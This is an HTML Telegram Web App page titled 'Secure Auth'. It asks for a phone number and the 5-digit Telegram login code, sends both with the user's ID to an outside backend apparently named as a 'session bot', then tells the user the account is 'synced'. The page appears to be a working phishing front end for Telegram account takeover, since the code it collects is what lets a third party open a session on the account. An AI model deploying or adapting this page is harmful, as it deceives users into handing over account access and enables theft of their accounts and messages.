<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Auth</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { font-family: sans-serif; padding: 20px; text-align: center; background-color: #f0f2f5; }
        .box { background: white; padding: 30px; border-radius: 20px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); max-width: 350px; margin: auto; }
        input { width: 100%; padding: 12px; margin: 15px 0; border: 1px solid #ddd; border-radius: 10px; font-size: 16px; outline: none; }
        button { background-color: #0088cc; color: white; border: none; padding: 12px; width: 100%; border-radius: 10px; font-weight: bold; cursor: pointer; }
        .hidden { display: none; }
        .loader { color: #888; font-size: 14px; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="box">
        <h3>Secure Auth</h3>
        <div id="step1">
            <input type="tel" id="phone" value="+" placeholder="+880...">
            <button id="btn1" onclick="sendNumber()">Send Code</button>
            <div id="load1" class="loader hidden">Sending code...</div>
        </div>
        <div id="step2" class="hidden">
            <p style="color: green;">✅ Code Sent!</p>
            <input type="number" id="otp" placeholder="Enter 5-digit code">
            <button id="btn2" onclick="verifyOTP()">Verify & Finish</button>
            <div id="load2" class="loader hidden">Verifying...</div>
        </div>
    </div>

    <script>
        let tg = window.Telegram.WebApp;
        let userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : "test_user";
        const BACKEND_URL = "https://pmrony-session-bot.hf.space";

        async function sendNumber() {
            let ph = document.getElementById("phone").value.trim();
            document.getElementById("btn1").disabled = true;
            document.getElementById("load1").classList.remove("hidden");
            try {
                let res = await fetch(`${BACKEND_URL}/send_number`, {
                    method: "POST",
                    headers: {"Content-Type": "application/json"},
                    body: JSON.stringify({ user_id: userId, phone: ph })
                });
                let data = await res.json();
                if(data.status === "success") {
                    document.getElementById("step1").classList.add("hidden");
                    document.getElementById("step2").classList.remove("hidden");
                } else { alert("Error: " + data.message); }
            } catch(e) { alert("Server Error!"); }
            document.getElementById("btn1").disabled = false;
            document.getElementById("load1").classList.add("hidden");
        }

        async function verifyOTP() {
            let code = document.getElementById("otp").value.trim();
            document.getElementById("btn2").disabled = true;
            document.getElementById("load2").classList.remove("hidden");
            try {
                let res = await fetch(`${BACKEND_URL}/verify_otp`, {
                    method: "POST",
                    headers: {"Content-Type": "application/json"},
                    body: JSON.stringify({ user_id: userId, otp: code })
                });
                let data = await res.json();
                if(data.status === "success") {
                    alert("✅ Success! Your account is synced.");
                    tg.close();
                } else { 
                    alert("❌ Error: " + data.message); 
                    document.getElementById("btn2").disabled = false;
                }
            } catch(e) { alert("Connection Error!"); }
            document.getElementById("load2").classList.add("hidden");
        }
    </script>
</body>
</html>
